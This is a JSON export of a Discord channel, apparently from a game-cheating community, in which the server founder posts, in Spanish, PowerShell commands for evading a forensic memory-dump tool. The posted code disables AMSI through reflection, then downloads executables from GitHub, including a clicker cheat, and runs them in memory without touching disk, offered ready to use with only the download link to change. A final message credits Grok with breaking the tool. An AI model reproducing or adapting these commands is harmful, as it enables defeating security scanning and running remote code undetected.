@@ -1,0 +1,216 @@
+{
+  "guild": {
+    "id": "1385680731212218449",
+    "name": "Bypass Screenshare",
+    "iconUrl": "https://cdn.discordapp.com/icons/1385680731212218449/3be219b22eb8a5390cc8b0c1c31cf0c6.png?size=512"
+  },
+  "channel": {
+    "id": "1512175261196746773",
+    "type": "GuildTextChat",
+    "categoryId": "1461571659453563052",
+    "category": "metodos avanzados",
+    "name": "»「\uD83D\uDCBB」lolbin–abusing-fileless",
+    "topic": null
+  },
+  "dateRange": {
+    "after": null,
+    "before": null
+  },
+  "exportedAt": "2026-06-17T21:15:13.1241853-03:00",
+  "messages": [
+    {
+      "id": "1512176152213721179",
+      "type": "Default",
+      "timestamp": "2026-06-04T16:28:09.562-03:00",
+      "timestampEdited": null,
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "buenas gente, estuve haciendo varios testeos y finalmente pude bypasear completamente el memory dump  de la tool https://github.com/orbdiff/fileless y ademas de bypasear su scriptblocking sin la necesidad de regedit, a diferencia de #»「\uD83E\uDE9E」reflective-assembly-loading este no deja log en textinput ni siquiera, aca tienen el comando\n\nlo unico que tienen que cambiar es en enlace raw para q el comando  funcione\n\n\n\n\nejemplos:\n\n``` [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n$null=[Reflection.Assembly]::Load([Text.Encoding]::UTF8.GetBytes('4QAAAAEAAQAAAAIAAAABAAIABAAAAA4AAABkAGUAcgB5AHIAbwB0AGUAcgB5AHMAaABlAGwAbAAuAGQAbABsAA==')).GetType('Derp.Derp').GetMethod('DoIt').Invoke($null,@())\n$bytes = (New-Object Net.WebClient).DownloadData('https://github.com/ccsgoq-byte/asdash/raw/main/engouranceCS%20v1.3.exe')\n$asm = [Reflection.Assembly]::Load($bytes)\n[System.Threading.Thread]::CurrentThread.SetApartmentState('STA')\ntry { $asm.EntryPoint.Invoke($null, @()) } catch { try { $asm.EntryPoint.Invoke($null, $null) } catch {} }\nAdd-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.Application]::EnableVisualStyles()\n[System.Windows.Forms.Application]::SetCompatibleTextRenderingDefault($false)\n[System.Windows.Forms.Application]::Run()``` \n\n\ncomo los demas fileless obvio el exe debe ser .net y .exe, les dejo otro ejemplo abajo, no me alcanza el mensaje",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [
+        {
+          "title": "GitHub - Orbdiff/Fileless: Detects fileless using powershell event ...",
+          "url": "https://github.com/orbdiff/fileless",
+          "timestamp": null,
+          "description": "Detects fileless using powershell event logs and has an option to analyze RAM, to detect possible pe injects, shellcode, etc. - Orbdiff/Fileless",
+          "color": "#1E2327",
+          "thumbnail": {
+            "url": "https://images-ext-1.discordapp.net/external/-qmvxvKb6NIxR5ZsCS9T5ovJXx7m_sPyfnSwEnNvlUU/https/opengraph.githubassets.com/8f4dc30a2f77fd648382b2c7bcf9068e994e766da194ec7649e2292a9f2b56fe/Orbdiff/Fileless",
+            "canonicalUrl": "https://opengraph.githubassets.com/8f4dc30a2f77fd648382b2c7bcf9068e994e766da194ec7649e2292a9f2b56fe/Orbdiff/Fileless",
+            "width": 1200,
+            "height": 600
+          },
+          "images": [],
+          "fields": [],
+          "inlineEmojis": []
+        }
+      ],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    },
+    {
+      "id": "1512176331868082228",
+      "type": "Default",
+      "timestamp": "2026-06-04T16:28:52.395-03:00",
+      "timestampEdited": "2026-06-04T16:38:57.585-03:00",
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "```[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n$null=[Reflection.Assembly]::Load([Text.Encoding]::UTF8.GetBytes('4QAAAAEAAQAAAAIAAAABAAIABAAAAA4AAABkAGUAcgB5AHIAbwB0AGUAcgB5AHMAaABlAGwAbAAuAGQAbABsAA==')).GetType('Derp.Derp').GetMethod('DoIt').Invoke($null,@())\n$bytes = (New-Object Net.WebClient).DownloadData('https://github.com/ccsgoq-byte/asdsa/raw/main/Sapphire_Clicker%20(OUTDATED%20LEAK).exe')\n$asm = [Reflection.Assembly]::Load($bytes)\n[System.Threading.Thread]::CurrentThread.SetApartmentState('STA')\ntry { $asm.EntryPoint.Invoke($null, @()) } catch { try { $asm.EntryPoint.Invoke($null, $null) } catch {} }\nAdd-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.Application]::EnableVisualStyles()\n[System.Windows.Forms.Application]::SetCompatibleTextRenderingDefault($false)\n[System.Windows.Forms.Application]::Run()\n```",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [
+        {
+          "id": "1512176329708273845",
+          "url": "https://cdn.discordapp.com/attachments/1512175261196746773/1512176329708273845/image.png?ex=6a3446f3&is=6a32f573&hm=ec19416700eb7309a83d971076ccee73854c925e49178abd8377f44c50523d98&",
+          "fileName": "image.png",
+          "fileSizeBytes": 94472
+        },
+        {
+          "id": "1512176330253406318",
+          "url": "https://cdn.discordapp.com/attachments/1512175261196746773/1512176330253406318/image.png?ex=6a3446f4&is=6a32f574&hm=4b94ab045e6696571229fa484d1efa6a7281dd08226f820cea66a61fa2d7303f&",
+          "fileName": "image.png",
+          "fileSizeBytes": 89362
+        },
+        {
+          "id": "1512176330681094154",
+          "url": "https://cdn.discordapp.com/attachments/1512175261196746773/1512176330681094154/image.png?ex=6a3446f4&is=6a32f574&hm=db5d1a9220a068cf3f03b8393284a7849ef87ea0a8a5dbbf3837dbe178ec8b8c&",
+          "fileName": "image.png",
+          "fileSizeBytes": 70813
+        },
+        {
+          "id": "1512176331054514256",
+          "url": "https://cdn.discordapp.com/attachments/1512175261196746773/1512176331054514256/image.png?ex=6a3446f4&is=6a32f574&hm=a69ba352182c2f41f038525b7837706fe9b2803f464f6f2cac12f8945bf13cbd&",
+          "fileName": "image.png",
+          "fileSizeBytes": 34194
+        },
+        {
+          "id": "1512176331603972293",
+          "url": "https://cdn.discordapp.com/attachments/1512175261196746773/1512176331603972293/image.png?ex=6a3446f4&is=6a32f574&hm=7b00af25f519b9750854d0268e79d881b1bb1f28d9b13fe7765439740bbf7912&",
+          "fileName": "image.png",
+          "fileSizeBytes": 95598
+        }
+      ],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [
+        {
+          "emoji": {
+            "id": "",
+            "name": "✅",
+            "code": "white_check_mark",
+            "isAnimated": false,
+            "imageUrl": "https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/svg/2705.svg"
+          },
+          "count": 4,
+          "users": [
+            {
+              "id": "980170601987723294",
+              "name": "xsolo7",
+              "discriminator": "0000",
+              "nickname": "xsolo",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/980170601987723294/864d635a739b38c5d83d1337d891e494.png?size=512"
+            },
+            {
+              "id": "1260804868898164736",
+              "name": "donlll23",
+              "discriminator": "0000",
+              "nickname": "lll",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1260804868898164736/325e66eda17594ceb696d25552fea4af.png?size=512"
+            },
+            {
+              "id": "1402712520598356008",
+              "name": "sheptie",
+              "discriminator": "0000",
+              "nickname": "macai",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1402712520598356008/486617c64aaf7b964d8380b86597f0ef.png?size=512"
+            },
+            {
+              "id": "1423072555526262915",
+              "name": "kervan420",
+              "discriminator": "0000",
+              "nickname": "Kervan",
+              "color": null,
+              "isBot": false,
+              "avatarUrl": "https://cdn.discordapp.com/avatars/1423072555526262915/0e6819e0138eb1a2c1478b4d54c543f0.png?size=512"
+            }
+          ]
+        }
+      ],
+      "mentions": [],
+      "inlineEmojis": []
+    },
+    {
+      "id": "1512176571916619897",
+      "type": "Default",
+      "timestamp": "2026-06-04T16:29:49.627-03:00",
+      "timestampEdited": "2026-06-04T16:34:22.126-03:00",
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "tool fucked by grok",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    }
+  ],
+  "messageCount": 3
+}
